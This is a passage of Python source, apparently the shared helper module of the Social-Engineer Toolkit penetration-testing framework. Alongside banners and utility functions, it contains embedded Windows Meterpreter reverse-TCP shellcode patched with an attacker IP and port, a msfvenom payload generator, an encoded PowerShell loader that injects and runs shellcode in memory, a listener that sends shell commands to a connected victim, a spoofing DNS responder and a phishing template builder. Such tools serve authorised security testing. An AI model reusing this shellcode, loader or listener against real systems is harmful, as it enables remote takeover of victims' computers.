        .     `MM   MM   Y  ,     MM
        Mb     dM   MM     ,M     MM
        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
        return

    if menu == 7:
        print bcolors.YELLOW + r"""
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     """ + bcolors.ENDC
        return

    if menu == 8:
        print bcolors.RED + r'''
          !\_________________________/!\
          !!                         !! \
          !! Social-Engineer Toolkit !!  \
          !!                         !!  !
          !!          Free           !!  !
          !!                         !!  !
          !!          #hugs          !!  !
          !!                         !!  !
          !!      By: TrustedSec     !!  /
          !!_________________________!! /
          !/_________________________\!/
             __\_________________/__/!_
            !_______________________!/
          ________________________
         /oooo  oooo  oooo  oooo /!
        /ooooooooooooooooooooooo/ /
       /ooooooooooooooooooooooo/ /
      /C=_____________________/_/''' + bcolors.ENDC

    
    if menu == 9:
        print bcolors.YELLOW + """
     01011001011011110111010100100000011100
     10011001010110000101101100011011000111
     10010010000001101000011000010111011001
     10010100100000011101000110111100100000
     01101101011101010110001101101000001000
     00011101000110100101101101011001010010
     00000110111101101110001000000111100101
     10111101110101011100100010000001101000
     01100001011011100110010001110011001000
     00001110100010110100101001001000000101
     01000110100001100001011011100110101101
     11001100100000011001100110111101110010
     00100000011101010111001101101001011011
     10011001110010000001110100011010000110
     01010010000001010011011011110110001101
     10100101100001011011000010110101000101
     01101110011001110110100101101110011001
     01011001010111001000100000010101000110
     11110110111101101100011010110110100101
     11010000100000001010100110100001110101
     011001110111001100101010""" + bcolors.ENDC


    if menu == 10:
        print bcolors.GREEN + """
                          .  ..                             
                       MMMMMNMNMMMM=                        
                   .DMM.           .MM$                     
                 .MM.                 MM,.                  
                 MN.                    MM.                 
               .M.                       MM                 
              .M   .....................  NM                
              MM   .8888888888888888888.   M7               
             .M    88888888888888888888.   ,M               
             MM       ..888.MMMMM    .     .M.              
             MM         888.MMMMMMMMMMM     M               
             MM         888.MMMMMMMMMMM.    M               
             MM         888.      NMMMM.   .M               
              M.        888.MMMMMMMMMMM.   ZM               
              NM.       888.MMMMMMMMMMM    M:               
              .M+      .....              MM.               
               .MM.                     .MD                 
                 MM .                  .MM                  
                  $MM                .MM.                   
                    ,MM?          .MMM                      
                       ,MMMMMMMMMMM 
                     
                https://www.trustedsec.com""" + bcolors.ENDC

    if menu == 11:
        print bcolors.backBlue + r"""
                          _                                           J
                         /-\                                          J
                    _____|#|_____                                     J
                   |_____________|                                    J
                  |_______________|                                   E
                 ||_POLICE_##_BOX_||                                  R
                 | |-|-|-|||-|-|-| |                                  O
                 | |-|-|-|||-|-|-| |                                  N
                 | |_|_|_|||_|_|_| |                                  I
                 | ||~~~| | |---|| |                                  M
                 | ||~~~|!|!| O || |                                  O
                 | ||~~~| |.|___|| |                                  O
                 | ||---| | |---|| |                                  O
                 | ||   | | |   || |                                  O
                 | ||___| | |___|| |                                  !
                 | ||---| | |---|| |                                  !
                 | ||   | | |   || |                                  !
                 | ||___| | |___|| |                                  !
                 |-----------------|                                  !
                 |   Timey Wimey   |                                  !
                 -------------------                                  !""" + bcolors.ENDC


#
# identify if set interactive shells are disabled
#
def set_check():
    fileopen=file("config/set_config", "r")
    for line in fileopen:
        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
        # if we turned it off then we return a true else return false
        if match:
            return True
        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
        # return false otherwise
        if match1:
            return False

# if the user specifies 99
def menu_back():
    print_info("Returning to the previous menu...")

# used to generate random templates for the phishing schema
def custom_template():
    try:
        print ("         [****]  Custom Template Generator [****]\n")
        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
        author=raw_input(setprompt("0", "Enter the name of the author"))
        filename=randomgen=random.randrange(1,99999999999999999999)
        filename=str(filename)+(".template")
        subject=raw_input(setprompt("0", "Enter the subject of the email"))
        try:
            body=raw_input(setprompt("0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
            while body != 'sdfsdfihdsfsodhdsofh':
                try:
                    body+=(r"\n")
                    body+=raw_input("Next line of the body: ")
                except KeyboardInterrupt: break
        except KeyboardInterrupt: pass
        filewrite=file("src/templates/%s" % (filename), "w")
        filewrite.write("# Author: "+author+"\n#\n#\n#\n")
        filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
        filewrite.write('BODY='+'"'+body+'"\n')
        print "\n"
        filewrite.close()
    except Exception, e:
        print_error("ERROR:An error occured:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# routine for checking length of a payload: variable equals max choice
def check_length(choice,max):
    # start initital loop
    counter = 0
    while 1:
        if counter == 1:
            choice = raw_input(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + "Invalid choice try again: ")
        # try block in case its not a integer
        try:
            # check to see if its an integer
            choice = int(choice)
            # okay its an integer lets do the compare
            if choice > max:
                # trigger an exception as not an int
                choice = "blah"
                choice = int(choice)
            # if everythings good return the right choice
            return choice
        # oops, not a integer
        except Exception:
            counter = 1

# valid if IP address is legit
def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)

# ipv4
def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# ipv6
def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           # A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           # Another group
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           # Last group
            (?: (?<=::)             # Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          # A v4 address with NO leading zeros
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None


# kill certain processes
def kill_proc(port,flag):
    proc=subprocess.Popen("netstat -antp | grep '%s'" % (port), shell=True, stdout=subprocess.PIPE)
    stdout_value=proc.communicate()[0]
    a=re.search("\d+/%s" % (flag), stdout_value)
    if a:
        b=a.group()
        b=b.replace("/%s" % (flag),"")
        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


# check the config file and return value
def check_config(param):
    fileopen = file("%s/config/set_config" % (definepath()), "r")
    for line in fileopen:
        line=line.rstrip()
        #print line
        # if the line starts with the param we want then we are set, otherwise if it starts with a # then ignore
        if line.startswith(param) != "#":
           if line.startswith(param):
                line = line.rstrip()
                # remove any quotes or single quotes
                line = line.replace('"', "")
                line = line.replace("'", "")
                line = line.split("=")
                return line[1]

# copy an entire folder function
def copyfolder(sourcePath, destPath):
    for root, dirs, files in os.walk(sourcePath):

    #figure out where we're going
        dest = destPath + root.replace(sourcePath, '')

        #if we're in a directory that doesn't exist in the destination folder
        #then create a new folder
        if not os.path.isdir(dest):
            os.mkdir(dest)

        #loop through all files in the directory
        for f in files:

            #compute current (old) & new file locations
            oldLoc = root + '/' + f
            newLoc = dest + '/' + f

            if not os.path.isfile(newLoc):
                try:
                    shutil.copy2(oldLoc, newLoc)
                except IOError:
                    pass


# this routine will be used to check config options within the set.options
def check_options(option):
        # open the directory
    trigger = 0
    fileopen = file(setdir + "/set.options", "r").readlines()
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = line.rstrip()
            line = line.replace('"', "")
            line = line.split("=")
            return line[1]
            trigger = 1
    if trigger == 0: return trigger

# future home to update one localized set configuration file
def update_options(option):
        # if the file isn't there write a blank file
    if not os.path.isfile(setdir + "/set.options"):
        filewrite = file(setdir + "/set.options", "w")
        filewrite.write("")
        filewrite.close()

    # remove old options
    fileopen = file(setdir + "/set.options", "r")
    old_options = ""
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = ""
        old_options = old_options + line
    # append to file
    filewrite = file(setdir + "/set.options", "w")
    filewrite.write(old_options + "\n" + option + "\n")
    filewrite.close()

# python socket listener
def socket_listener(port):
    port = int(port)          # needed integer for port
    host = ''                 # Symbolic name meaning the local host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print "Listening on 0.0.0.0:%s" % str(port)
    # listen for only 1000 connection
    s.listen(1000)
    conn, addr = s.accept()
    print 'Connected by', addr
    data = conn.recv(1024)
    # start loop

    while 1:
        command = raw_input("Enter shell command or quit: ")
        conn.send(command)
        # if we specify quit then break out of loop and close socket
        if command == "quit": break
        data = conn.recv(1024)
        print data
    conn.close()

# generates powershell payload
def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):

    # generate our shellcode first
    shellcode = metasploit_shellcode(payload, ipaddr, port)
    shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater = floater + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]
    # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))	
    # unicode and base64 encode and return it
    return base64.b64encode(powershell_command.encode('utf_16_le'))

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    msf_path = meta_path()
    # generate payload
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
    # return data
    print data
    return data

# this will take input for shellcode and do a replace for IP addresses
def shellcode_replace(ipaddr, port, shellcode):

    # split up the ip address
    ip = ipaddr.split('.')
    # join the ipaddress into hex value spaces still in tact
    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))

    # We use a default 255.254.253.252 on all shellcode then replace
    # 255.254.253.252 --> hex --> ff fe fd fc
    # 443 = '0x1bb'
    if port != "443":
        port = hex(int(port))
        # hack job in order to get ports into right format
        # if we are only using three numbers then you have to flux in a zero
        if len(port) == 5:
            port = port.replace("0x", "\\x0")
        else:
            port = port.replace("0x", "\\x")
        # here we break the counters down a bit to get the port into the right format
        counter = 0
        new_port = ""
        for a in port:
            if counter < 4:
                new_port += a
            if counter == 4:
                new_port += "\\x" + a
                counter = 0
            counter = counter + 1
        # redefine the port in hex here
        port = new_port

    ipaddr = ipaddr.split(" ")
    first = ipaddr[0]
    # split these up to make sure its in the right format
    if len(first) == 1:
        first = "0" + first
    second = ipaddr[1]
    if len(second) == 1:
        second = "0" + second
    third = ipaddr[2]
    if len(third) == 1:
        third = "0" + third
    fourth = ipaddr[3]
    if len(fourth) == 1:
        fourth = "0" + fourth

    # put the ipaddress into the right format
    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)

    if port != "443":
        # getting everything into the right format
        if len(port) > 4:
            port = "\\x00" + port
        # if we are using a low number like 21, 23, etc.
        if len(port) == 4:
            port = "\\x00\\x00" + port
        shellcode = shellcode.replace(r"\x00\x01\xbb", port)

    # return shellcode
    return shellcode

# exit routine
def exit_set():
    cleanup_routine()
    print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"
    sys.exit()


# these are payloads that are callable
def metasploit_shellcode(payload, ipaddr, port):

    # if we are using reverse meterpreter tcp
    if payload == "windows/meterpreter/reverse_tcp":
        #shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
        shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"

    # reverse https requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_https":
        print_status("Reverse_HTTPS takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse http requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_http":
        print_status("Reverse_HTTP takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # allports requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_tcp_allports":
        print_status("Reverse TCP Allports takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse tcp needs to be rewritten for shellcode, will do later
    if payload == "windows/shell/reverse_tcp":
        print_status("Reverse Shell takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse meterpreter tcp
    if payload == "windows/x64/meterpreter/reverse_tcp":
        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"

    return shellcode

# here we encrypt via aes, will return encrypted string based on secret key which is random
def encryptAES(secret, data):

    # the character used for padding--with a block cipher such as AES, the value
    # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
    # used to ensure that your value is always a multiple of BLOCK_SIZE
    PADDING = '{'

    BLOCK_SIZE = 32

    # one-liner to sufficiently pad the text to be encrypted
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

    # random value here to randomize builds
    a = 50 * 5

    # one-liners to encrypt/encode and decrypt/decode a string
    # encrypt with AES, encode with base64
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    cipher = AES.new(secret)

    aes = EncodeAES(cipher, data)
    return str(aes)

# compare ports to make sure its not already in a config file for metasploit
def check_ports(filename, port):
    fileopen = file(filename, "r")
    data = fileopen.read()
    match = re.search("LPORT " + port, data)
    if match:
        return True
    else:
        return False

# main dns class
class DNSQuery:
    def __init__(self, data):
        self.data=data
        self.dominio=''

        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])

    def respuesta(self, ip):
        packet=''
        if self.dominio:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
        return packet

# main dns routine
def dns():
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.bind(('',53))
        try:
            while 1:
                data, addr = udps.recvfrom(1024)
                p=DNSQuery(data)
                udps.sendto(p.respuesta(ip), addr)

        except KeyboardInterrupt:
            print "Exiting the DNS Server.."
            sys.exit()
            udps.close()

# start dns 
def start_dns():
		thread.start_new_thread(dns,())

# the main ~./set path for SET 
def setdir():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '.set')
    if check_os() == "windows":
        return "src/program_junk/"
# set the main directory for SET 
setdir = setdir()

# Copyright (c) 2007 Brandon Sterne
# Licensed under the MIT license.
# http://brandon.sternefamily.net/files/mit-license.txt
# CIDR Block Converter - 2007

# convert an IP address from its dotted-quad format to its
# 32 binary digit representation
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# convert a decimal number to binary representation
# if d is specified, left-pad the binary number with 0s to that length
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified
def printCIDR(c):
        parts = c.split("/")
        baseIP = ip2bin(parts[0])
        subnet = int(parts[1])
        # Python string-slicing weirdness:
        # if a subnet of 32 was specified simply print the single IP
        if subnet == 32:
            ipaddr = bin2ip(baseIP)
        # for any other size subnet, print a list of IP addresses by concatenating
        # the prefix with each of the suffixes in the subnet
        else:
            ipPrefix = baseIP[:-(32-subnet)]
            breakdown = ''
            for i in range(2**(32-subnet)):
                ipaddr = bin2ip(ipPrefix+dec2bin(i, (32-subnet)))
                ip_check = is_valid_ip(ipaddr)
                if ip_check != False:
                    #return str(ipaddr)
                    breakdown = breakdown + str(ipaddr) + ","
            return breakdown

# input validation routine for the CIDR block specified
def validateCIDRBlock(b):
    # appropriate format for CIDR block ($prefix/$subnet)
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        return False
    # extract prefix and subnet size
    prefix, subnet = b.split("/")
    # each quad has an appropriate value (1-255)
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            #print "Error: quad "+str(q)+" wrong size."
            return False
    # subnet is an appropriate value (1-32)
    if (int(subnet) < 1) or (int(subnet) > 32):
        print "Error: subnet "+str(subnet)+" wrong size."
        return False
    # passed all checks -> return True
    return True

# Queries a remote host on UDP:1434 and returns MSSQL running port
# Written by Larry Spohn (spoonman) @ TrustedSec
def get_sql_port(host):

    # Build the socket with a .1 second timeout
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(.1)

    # Attempt to query UDP:1434 and return MSSQL running port
    try:
        port = 1434;
        msg = "\x02\x41\x41\x41\x41"
        s.sendto(msg, (host, port))
        d = s.recvfrom(1024)

        sql_port = d[0].split(";")[9]
        return sql_port

    except:
        pass

# capture output from a function
def capture(func, *args, **kwargs):
    """Capture the output of func when called with the given arguments.

    The function output includes any exception raised. capture returns
    a tuple of (function result, standard output, standard error).
    """
    stdout, stderr = sys.stdout, sys.stderr
    sys.stdout = c1 = cStringIO.StringIO()
    sys.stderr = c2 = cStringIO.StringIO()
    result = None
    try:
        result = func(*args, **kwargs)
    except:
        traceback.print_exc()
    sys.stdout = stdout
    sys.stderr = stderr
    return (result, c1.getvalue(), c2.getvalue())


def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = file("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        # if we aren't running kali
        else: return "Non-Kali"
    else:
        print "[!] Not running a Debian variant.."
        return "Non-Kali"

# checking if we have bleeding-edge enabled for updates
def bleeding_edge():
    # first check if we are actually using Kali
    kali = check_kali()
    if kali == "Kali":
        print "[*] Checking to see if bleeding-edge repos are active."
        # check if we have the repos enabled first
        fileopen = file("/etc/apt/sources.list", "r")
        kalidata = fileopen.read()
        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
            print "[*] Bleeding edge already active..Moving on.."
            return True
        else:
            print "[!] Bleeding edge repos were not detected. This is recommended."
            enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
            if enable == "y" or enable == "yes":
                print "[*] Adding Kali bleeding edge to sources.list for updates."
                # we need to add repo to kali file
                # we will rewrite the entire apt in case not all repos are there
                filewrite = file("/etc/apt/sources.list", "w")
                filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
                filewrite.close()
